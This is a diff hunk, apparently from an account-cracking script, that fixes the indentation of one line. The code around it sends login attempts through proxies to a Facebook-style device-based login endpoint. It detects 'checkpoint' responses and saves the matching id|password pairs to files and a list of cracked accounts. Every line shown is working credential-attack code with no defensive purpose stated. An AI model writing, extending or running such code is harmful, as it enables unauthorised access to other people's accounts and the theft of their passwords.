@@ -1402,7 +1402,7 @@ def regulerv3(idf,pwv,url):
 			"accept-language": "zh-CN;q=0.8,zh;q=0.9",
 			"x-response-format": "JSONStream"}		
 			po = ses.post(f"https://{url}/login/device-based/login/async/?refsrc=deprecated&lwv=100",headers=head,data=date,allow_redirects=False,proxies=proxs)
-				if "checkpoint" in po.cookies.get_dict().keys():
+			if "checkpoint" in po.cookies.get_dict().keys():
 				print(f' {P}[{K}Rudal CP{P}] {K}{idf}|{pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
